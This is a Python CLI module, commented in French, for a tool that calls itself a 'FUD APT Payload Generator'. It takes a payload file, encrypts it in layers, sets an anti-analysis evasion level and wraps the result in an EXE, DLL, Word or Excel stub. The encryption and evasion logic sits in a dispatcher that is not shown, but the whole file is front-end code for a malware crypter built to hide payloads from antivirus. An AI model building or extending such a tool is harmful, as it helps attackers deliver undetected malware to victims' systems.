# =======================
# 🔧 CORE – Orchestration
# =======================

import argparse
import json
import os

from .dispatcher import BuildDispatcher
from .logger import Logger


class CLIBuilder:
    def __init__(self):
        self.logger = Logger()

    def parse_args(self):
        """🧾 Lecture des arguments CLI"""
        parser = argparse.ArgumentParser(description='🔐 RYPTER Builder – FUD APT Payload Generator')
        parser.add_argument('--payload', required=True, help='Chemin vers le fichier payload à chiffrer')
        parser.add_argument('--config', help='Fichier JSON de configuration supplémentaire')
        parser.add_argument('--output', default='./output', help='Répertoire de sortie (par défaut: ./output)')
        parser.add_argument('--encryption', choices=['AES-GCM', 'AES-CBC+XOR', 'Triple Layer'],
                            default='AES-GCM', help='Méthode de chiffrement')
        parser.add_argument('--evasion', choices=['Basic', 'Medium', 'High', 'Maximum'],
                            default='High', help='Niveau d’évasion anti-analysis')
        parser.add_argument('--format', choices=['EXE', 'DLL', 'Word', 'Excel'],
                            default='EXE', help='Format de sortie final (stub)')

        return parser.parse_args()

    def load_config(self, config_path):
        """📄 Charge une configuration JSON si fournie"""
        if config_path and os.path.exists(config_path):
            with open(config_path, 'r') as f:
                return json.load(f)
        return {}

    def build(self):
        """🏗️ Lance la génération complète"""
        args = self.parse_args()
        config = self.load_config(args.config)

        # 🔀 Fusion configuration CLI et fichier
        build_config = {
            'payload_path': args.payload,
            'output_dir': args.output,
            'encryption_method': args.encryption,
            'evasion_level': args.evasion,
            'target_format': args.format,
            **config  # surcharge avec la config externe
        }

        dispatcher = BuildDispatcher(build_config, self.logger.log)
        success, output_path = dispatcher.build_all()

        if success:
            print(f"\n✅ Build terminé avec succès : {output_path}")
            return 0
        else:
            print("\n❌ Build échoué.")
            return 1


if __name__ == "__main__":
    builder = CLIBuilder()
    exit(builder.build())
